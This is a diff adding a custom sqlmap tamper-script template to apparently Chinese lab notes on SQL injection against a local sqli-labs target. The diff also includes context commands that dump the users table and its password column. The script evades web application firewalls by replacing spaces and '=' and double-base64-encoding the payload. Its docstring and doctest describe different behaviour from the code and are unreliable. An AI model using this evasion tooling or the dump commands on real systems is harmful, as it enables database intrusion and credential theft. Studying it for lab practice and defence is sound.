@@ -247,3 +247,72 @@ sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --dump -C'id,username,password' -
 sqlmap -u "http://127.0.0.1:8888/Less-1/?id=1" --count -T 'users' -D 'security'
 ```
 
+
+^
+## **自定义脚本模板**
+```
+#!/usr/bin/env python
+
+"""
+Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
+"""
+
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+import base64
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Replaces space character (' ') with comments '/**/'
+
+    Tested against:
+        * Microsoft SQL Server 2005
+        * MySQL 4, 5.0 and 5.5
+        * Oracle 10g
+        * PostgreSQL 8.3, 8.4, 9.0
+
+    Notes:
+        * Useful to bypass weak and bespoke web application firewalls
+
+    >>> tamper('SELECT id FROM users')
+    'SELECT/**/id/**/FROM/**/users'
+    """
+
+    retVal = payload
+
+    if payload:
+        retVal = ""
+        quote, doublequote, firstspace = False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace = True
+                    retVal += chr(0x9)
+                    continue
+
+            elif payload[i] == '\'':
+                quote = not quote
+
+            elif payload[i] == '"':
+                doublequote = not doublequote
+
+            elif payload[i] == '=':
+                retVal += chr(0x9) + 'like' + chr(0x9)
+                continue
+
+            elif payload[i] == " " and not doublequote and not quote:
+                retVal += chr(0x9)
+                continue
+
+            retVal += payload[i]
+    payload_ret = retVal
+    retVal = base64.b64encode(base64.b64encode(payload_ret[::-1].encode()).decode()[::-1].encode()).decode()
+
+    return retVal
+```
